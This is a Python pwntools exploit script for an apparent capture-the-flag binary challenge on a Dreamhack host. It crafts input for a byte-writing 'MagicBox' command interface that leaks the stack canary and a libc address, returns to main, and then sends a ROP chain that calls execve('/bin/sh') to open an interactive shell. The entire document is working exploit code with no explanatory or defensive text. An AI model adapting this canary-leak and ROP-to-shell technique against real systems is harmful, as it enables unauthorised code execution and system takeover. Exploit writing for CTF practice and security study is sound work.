#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 13873)

    return r

class MagicBox:
    def __init__(self):
        self.p = b""  
        self.idx = 0
    
    def write_byte(self, idx, val):
        if idx > self.idx:
            self.inc_idx(idx - self.idx)
        elif idx < self.idx:
            self.dec_idx(self.idx - idx)
        
        self.p += b"E" + val
        self.idx = idx

    def write_bytes(self, start_idx, val):
        for i, b in enumerate(val):
            b = f"{b:02x}".encode()
            self.write_byte(start_idx + i, b)

    def inc_idx(self, cnt):
        self.p += b"C" * cnt
        self.idx += cnt

    def dec_idx(self, cnt):
        self.p += b"D" * cnt
        self.idx -= cnt

    def print(self):
        self.p += b"A"

    def end(self):
        self.p += b"B" + p8(0x37 + 48)


def main():
    r = conn()

    box = MagicBox()
    
    box.write_byte(14, b"99")
    box.write_byte(15, b"99")
    
    for i in range(23, 63):
        box.write_byte(i, b"99")

    box.print()

    box.write_byte(15, b"00")

    main_addr = p64(0x401574)
    box.write_bytes(31, main_addr)
    box.end()

    r.send(box.p)

    r.recvn(16)
    canary = b"\x00" + r.recvn(7)
    r.recvn(40)

    leak = r.recvn(6, timeout=1.0)
    if len(leak) < 6:
        log.error(f"leak failed. len: {len(leak)}")
    __libc_start_call_main = u64(leak.ljust(8, b"\x00")) - 128
    
    libc.address = __libc_start_call_main - libc.symbols["__libc_start_call_main"]
    binsh = next(libc.search(b"/bin/sh"))
    execve = libc.symbols["execve"]
    rop = ROP(libc)
    rdi_gadget = rop.find_gadget(["pop rdi", "ret"])[0]
    rsi_gadget = rop.find_gadget(["pop rsi", "ret"])[0]
    rdx_gadget = rop.find_gadget(["pop rdx", "pop r12", "ret"])[0]

    chain = p64(rdi_gadget)
    chain += p64(binsh)
    chain += p64(rsi_gadget)
    chain += p64(0)
    chain += p64(rdx_gadget)
    chain += p64(0)
    chain += p64(0)
    chain += p64(execve)
    
    box2 = MagicBox()

    box2.write_bytes(31, chain)
    box2.end()

    r.send(box2.p)

    r.interactive()


if __name__ == "__main__":
    main()
